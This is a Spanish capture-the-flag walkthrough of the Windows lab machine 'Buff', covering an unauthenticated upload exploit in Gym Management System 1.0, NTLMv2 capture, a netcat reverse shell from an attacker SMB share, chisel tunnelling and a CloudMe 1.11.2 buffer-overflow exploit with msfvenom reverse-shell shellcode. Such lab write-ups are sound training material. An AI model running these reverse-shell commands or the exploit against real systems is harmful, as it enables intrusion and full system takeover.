# Buff

![](../../../../~gitbook/image.md)Publicado: 16 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Buff es una máquina Windows de dificultad fácil que presenta vulnerabilidades en una aplicación web de gestión de gimnasio. La explotación inicial se basa en un exploit público para el Gym Management System v1.0, que permite la ejecución remota de código sin autenticación mediante una vulnerabilidad de subida de archivos maliciosos.Para la escalada de privilegios, se aprovecha una vulnerabilidad de Buffer Overflow en el servicio CloudMe v1.11.2, que se ejecuta localmente en el puerto 8888. La explotación requiere el uso de port forwarding para acceder al servicio y posteriormente ejecutar un shellcode personalizado para obtener privilegios de administrador.
####🎯 Objetivos de Aprendizaje
- Explotación de vulnerabilidades en aplicaciones web
- Técnicas de evasión de filtros de subida de archivos
- Buffer Overflow en aplicaciones Windows
- Port forwarding con Chisel
- Uso de SMB para captura de hashes NTLMv2

###🔭 Reconocimiento

####🔍 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔬 Enumeración de servicios

###🌐 Enumeración Web

####🏋️ Puerto 8080 - Apache/2.4.43
URL: [http://10.10.10.198:8080/](http://10.10.10.198:8080/)![](../../../../~gitbook/image.md)🎯 Información Relevante EncontradaEn la sección de contacto se revela:- Software: Gym Management System
- Versión: v1.0
- Esta información es crucial para buscar vulnerabilidades conocidas
![](../../../../~gitbook/image.md)Fuzzing de directorios
####📁 Análisis de Recursos Encontrados
Revisamos y analizamos cada uno de los recursos encontrados:🔧 /edit.php - http://10.10.10.198:8080/edit.php- Revela Internal Path Disclosure
- Muestra rutas internas del sistema
![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)**📤 /upload.php ** - http://10.10.10.198:8080/register.php- Página de subida de archivos
- Vulnerable - No requiere autenticación
- Revela Internal Path Disclosure
- Punto crítico para la explotación
![](../../../../~gitbook/image.md)📂 /upload/ - http://10.10.10.198:8080/upload/- Directorio de archivos subidos
- Accesible públicamente
![](../../../../~gitbook/image.md)📖 /README.MD - http://10.10.10.198:8080/README.MD- Contiene información del proyecto
- Confirma el uso de Gym Management System
![](../../../../~gitbook/image.md)🖥️ /cgi-bin/printenv.pl Script en Perl que muestra variables de entorno del servidor:
http://10.10.10.198:8080/cgi-bin/printenv.plParece que se trata script en perl ubicado en el directorio `cgi-bin`, que típicamente se usa para ejecutar scripts CGI (Common Gateway Interface) cuyo propósito es imprimir todas las variables de entorno del servidor web en la salida HTTP.
###💥 Explotación Inicial

####🔎 Búsqueda de Vulnerabilidades - Gym Management System
Habíamos enumerado un servicio llamado Gym Management y vemos que la versión que se está utilizando ha presentado vulnerabilidades en el pasado y además hay exploits públicos:![](../../../../~gitbook/image.md)Uno de los exploits permite una ejecución remota de comandos sin autenticación debido a un mal manejo en la subida de archivos.Resultados encontrados:- CVE-2020-15928: Gym Management System 1.0 - Unauthenticated Remote Code Execution
- Exploit ID: 48506
- Tipo: Remote Code Execution sin autenticación
🔍 Detalles clave de la vulnerabilidad- `upload.php` no exige autenticación - Cualquier usuario puede acceder
- Parámetro `id` por GET - Define el nombre del archivo a subir
- Validación insuficiente - Permite dobles extensiones (ej: `poc.php.png`)
- Verificación MIME débil - Solo valida cabeceras HTTP falsificables
- Ejecución de código PHP - Los archivos subidos pueden contener código malicioso
- Renombrado basado en extensión - Permite ejecución de PHP
🎯 Proceso de Explotación- Subida de archivo malicioso con doble extensión
- Bypass de filtros mediante falsificación de MIME type
- Ejecución de código PHP en el servidor
- Acceso vía URL con parámetros GET para comandos
Descargamos y ejecutamos el exploit y vemos que nos pide definir como parámetro únicamente la URL del objetivo:![](../../../../~gitbook/image.md)Resultado: ✅ Webshell obtenida exitosamente![](../../../../~gitbook/image.md)🎯 Captura de Hash NTLMv2Configuración del servidor SMB:
Una posible vía de explotación aquí sería levantarnos en nuestro host de ataque un servidor SMB usando impacket y a continuación desde el host en el que acabamos de subir la webshell hacer una petición a un recurso obligando así al usuario de la máquina a autenticarse y obtener su hash NTLMv2, que aunque no nos permite autenticarnos haciendo pass the hash sí que podemos intentar crackearlo para obtener su contraseña:![](../../../../~gitbook/image.md)A continuación usamos hashcat y el diccionario rockyou para crackearlo y obtener la contraseña del usuario shaun pero en este caso vemos que no nos da la contraseña:![](../../../../~gitbook/image.md)❌ El hash no pudo ser crackeadoEste método no nos sirve cómo vía potencial de explotación, sin embargo, no está todo perdido. Alternativamente podemos usar el recurso SMB que hemos compartido en el cual tenemos la herramienta netcat para usarla y establecer conexión con mi host de ataque:
####🐚 Reverse Shell alternativa
Primero inicio el listener con netcat en mi host de ataque:A continuación hago una petición al recurso compartido smbShare de mi host de ataque usando netcat para conectarme al listener de mi host de ataque:A los pocos segundos recibo la conexión reversa confirmando así la explotación y el acceso al sistema pudiendo obtener la primera flag en el directorio Desktop del usuario shaun:Resultado: ✅ Shell reversa como usuario `buff\shaun`
###🔝 Escalada de Privilegios

####🔍 Enumeración del Sistema
📁 Archivos Interesantes EncontradosEnumerando los directorios del usuario shaun encontramos lo siguiente:📄 C:\Users\shaun\Documents\Tasks.bat📦 C:\Users\shaun\Downloads\CloudMe_1112.exe
####🔎 Búsqueda de Vulnerabilidades - CloudMe
Buscamos información pública de este servicio así como posibles exploits y encontramos bastantes exploits relacionados con una explotación de Buffer Overflow:![](../../../../~gitbook/image.md)🌐 Verificación del ServicioLo primero que necesitamos saber es si CloudMe está ejecutándose en la máquina. El puerto por defecto es el 8888. Usamos `netstat -nat`para confirmarlo![](../../../../~gitbook/image.md)
####🔄 Port Forwarding con Chisel
Dado que este puerto no está expuesto, necesitamos hacer port forwading para poder acceder a él desde nuestro host de ataque. Para ello podemos usar chisel:Primero descargamos chisel server en su versión para linux, ya que esta la ejecutaremos en nuestro host de ataque a modo de server:Ahora nos descargamos la versión para windowsLa transferimos al host windows. Parece que aquí certutil da problemas así que usamos curlEjecutamos chisel como cliente usando el puerto 9003 que habíamos definido en el servidor chisel para hacer el redireccionamiento del puerto 8888 del host de la máquina windows al puerto 8888 de nuestro host de ataque:
####💣 Desarrollo del Exploit
🎯 Generación de ShellcodeAhora, debemos generar el payload usando el shellcode que tenemos en el exploit para que en lugar de cargar la calculadora como viene por defecto en la PoC ejecute una shell reversa, para ello usaremos msfvenom de la siguiente forma:🔧 Modificación del ExploitExploit base: 48389.py
Modificaciones realizadas:- Reemplazo del payload de calculadora por reverse shell
- Configuración de IP y puerto de ataque
- Ajuste de padding y NOPs
Exploit final:
####🎯 Ejecución del Buffer Overflow
Iniciamos un listener en el puerto 443 de nuestro host de ataque usando netcatEjecutamos el exploit y ganamos acceso a la máquina como Administrador:![](../../../../~gitbook/image.md)Resultado: ✅ Shell como NT AUTHORITY\SYSTEMFinalmente obtenemos la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💥 Explotación Inicial](#explotacion-inicial)
- [🔝 Escalada de Privilegios](#escalada-de-privilegios)

```
❯ ping -c2 10.10.10.198
PING 10.10.10.198 (10.10.10.198) 56(84) bytes of data.
64 bytes from 10.10.10.198: icmp_seq=1 ttl=127 time=213 ms
64 bytes from 10.10.10.198: icmp_seq=2 ttl=127 time=68.8 ms

--- 10.10.10.198 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 68.752/140.858/212.965/72.106 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.198 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
7680,8080
```

```
nmap -sC -sV -p$ports 10.10.10.198 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 09:16 CEST
Nmap scan report for 10.10.10.198
Host is up (0.042s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

```

```
dirsearch -u http://10.10.10.198:8080 -x 503,404,403

_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://10.10.10.198:8080/

[09:23:03] Scanning:
[09:23:05] 200 -    66B - /.gitattributes
[09:23:12] 200 -    5KB - /about.php
[09:23:31] 200 -    2KB - /cgi-bin/printenv.pl
[09:23:35] 200 -    4KB - /contact.php
[09:23:39] 200 -    4KB - /edit.php
[09:23:42] 200 -    4KB - /feedback.php
[09:23:44] 200 -   143B - /home.php
[09:23:45] 301 -   341B - /img  ->  http://10.10.10.198:8080/img/
[09:23:45] 301 -   345B - /include  ->  http://10.10.10.198:8080/include/
[09:23:47] 200 -    5KB - /index.php
[09:23:47] 200 -    5KB - /index.php.
[09:23:47] 200 -    5KB - /index.php/login/
[09:23:47] 200 -    5KB - /index.pHp
[09:23:49] 200 -   18KB - /license
[09:23:49] 200 -   18KB - /LICENSE
[09:24:01] 301 -   345B - /profile  ->  http://10.10.10.198:8080/profile/
[09:24:03] 200 -   309B - /README.MD
[09:24:03] 200 -   309B - /ReadMe.md
[09:24:03] 200 -   309B - /README.md
[09:24:03] 200 -   309B - /Readme.md
[09:24:03] 200 -   309B - /readme.md
[09:24:04] 200 -   137B - /register.php
[09:24:15] 200 -   209B - /up.php
[09:24:15] 301 -   344B - /upload  ->  http://10.10.10.198:8080/upload/
[09:24:15] 301 -   344B - /Upload  ->  http://10.10.10.198:8080/Upload/
[09:24:17] 200 -   107B - /upload.php

Task Completed
```

```
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="C:/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs/gym"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="keep-alive"
HTTP_COOKIE="sec_session_id=aigntd7sk9amgpclkn71puni8t"
HTTP_HOST="10.10.10.198:8080"
HTTP_PRIORITY="u=0, i"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
MIBDIRS="C:/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="C:/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\shaun\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.14.7"
REMOTE_PORT="59286"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.10.10.198"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="10.10.10.198"
SERVER_PORT="8080"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 Server at 10.10.10.198 Port 8080\n"
SERVER_SOFTWARE="Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"
```

```
searchsploit -m php/webapps/48506.py
python2.7 48506.py
```

```
python2.7 48506.py http://10.10.10.198:8080
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
dir \\10.10.14.7\smbShare
```

```
impacket-smbserver smbShare $(pwd) -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.198,49884)
[*] AUTHENTICATE_MESSAGE (BUFF\shaun,BUFF)
[*] User BUFF\shaun authenticated successfully
[*] shaun::BUFF:aaaaaaaaaaaaaaaa:f59f92b8c51a40a0b6eb7d1ce9bae144:010100000000000080d1a930a4dedb019173ad02205c367900000000010010004a00590072004500720054006c004f00030010004a00590072004500720054006c004f0002001000730077007300720053004a004200730004001000730077007300720053004a00420073000700080080d1a930a4dedb01060004000200000008003000300000000000000000000000002000007f5c16b04617650dcf64a6a4994866df28c51843b9272eb0681e38aebab70e4c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000
```

```
hashcat -m 5600 -a 0  hash_shaun /usr/share/wordlists/rockyou.txt
```

```
rlwrap nc -lnvp 443
```

```
\\10.10.14.7\smbShare\nc.exe -e cmd 10.10.14.7 443
```

```
rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.198] 49886
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun

C:\xampp\htdocs\gym\upload>
```

```
C:\>dir /r /s user.txt
dir /r /s user.txt
Volume in drive C has no label.
Volume Serial Number is A22D-49F7

Directory of C:\Users\shaun\Desktop

16/06/2025  08:13                34 user.txt
1 File(s)             34 bytes
```

```
C:\Users\shaun\Documents>dir
dir
Volume in drive C has no label.
Volume Serial Number is A22D-49F7

Directory of C:\Users\shaun\Documents

16/06/2020  22:26              .
16/06/2020  22:26              ..
16/06/2020  22:26                30 Tasks.bat
1 File(s)             30 bytes
2 Dir(s)   9,795,010,560 bytes free

C:\Users\shaun\Documents>type Tasks.bat
type Tasks.bat
START C:/xampp/xampp_start.exe
C:\Users\shaun\Documents>
```

```
C:\Users\shaun\Downloads>dir
dir
Volume in drive C has no label.
Volume Serial Number is A22D-49F7

Directory of C:\Users\shaun\Downloads

14/07/2020  13:27              .
14/07/2020  13:27              ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
1 File(s)     17,830,824 bytes
2 Dir(s)   9,802,326,016 bytes free
```

```
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

./chisel server --reverse --port 9003
2025/06/16 13:29:53 server: Reverse tunnelling enabled
2025/06/16 13:29:53 server: Fingerprint 1O7KQZMQk2rrF/xhgzIGzX9kuLXgEKs5hnpmKR7huW8=
2025/06/16 13:29:53 server: Listening on http://0.0.0.0:8000
```

```
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
```

```
python3 -m http.server 80

curl http://10.10.14.7/chisel -o chisel
```

```
chisel.exe client 10.10.14.7:9003 R:8888:localhost:8888

2025/06/16 12:45:55 client: Connecting to ws://10.10.14.7:8000
2025/06/16 12:45:56 client: Connected (Latency 46.1461ms)
```

```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -e x86 -b '\x00\x0A\x0D' -f python

[-] Skipping invalid encoder x86
[!] Couldn't find encoder to use
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1604 bytes
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
buf += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
buf += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
buf += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a"
buf += b"\x0e\x07\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
buf += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
buf += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
buf += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
buf += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
buf += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
buf += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
buf += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
buf += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
buf += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

```
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
payload += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
payload += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
payload += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
payload += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
payload += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
payload += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
payload += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
payload += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
payload += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
payload += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
payload += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
payload += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
payload += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
payload += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
payload += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a"
payload += b"\x0e\x07\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
payload += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
payload += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
payload += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
payload += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
payload += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
payload += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
payload += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
payload += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
payload += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
payload += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

payload = padding1 + EIP + NOPS + payload + overrun

try:
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,8888))
s.send(payload)
except Exception as e:
print(sys.exc_value)

```

```
nc -nlvp 443
```

```
python3 48389.py
```

```
C:\Users\Administrator\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is A22D-49F7

Directory of C:\Users\Administrator\Desktop

18/07/2020  17:36              .
18/07/2020  17:36              ..
16/06/2020  16:41             1,417 Microsoft Edge.lnk
16/06/2025  08:13                34 root.txt
2 File(s)          1,451 bytes
2 Dir(s)   9,782,939,648 bytes free

C:\Users\Administrator\Desktop>type root.txt
```
